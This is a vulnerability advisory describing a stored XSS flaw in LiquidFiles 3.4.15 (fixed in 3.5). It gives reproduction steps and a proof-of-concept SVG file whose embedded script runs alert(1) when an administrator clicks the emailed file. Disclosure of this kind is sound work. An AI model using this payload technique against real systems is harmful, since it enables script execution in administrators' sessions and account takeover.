=====[ Overview]========================================================
 * System affected : LiquidFiles
 * Software Version : Version  - 3.4.15
 * Impacts :
  * XSS: LiquidFiles 3.4.15 has stored XSS through the "send email"
functionality when sending a file via email to an administrator. When a
file has no extension and contains malicious HTML / JavaScript content
(such as SVG with HTML content), the payload is executed upon a click. This
is fixed in 3.5.



=====[ Detailed
description]=================================================

* Stored XSS at [http://localhost:8080/message/new]:

* Steps to reproduce

1 - Create a file without extension, with the content below inside
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,100 100,0" fill="#0000FF"
stroke="#0000FF"/>
   <script type="text/javascript">
  alert(1);
   </script>
</svg>
```
2 - With an external user send an email with that file (without any
extension) to admin or someone.

3 -  With the admin account go to the menu click on "Data", inside the
"Data" menu click at "Messages", and select the message that you sent at
step 2. At the table click on the filename row over your file, the
javascript code will be executed.
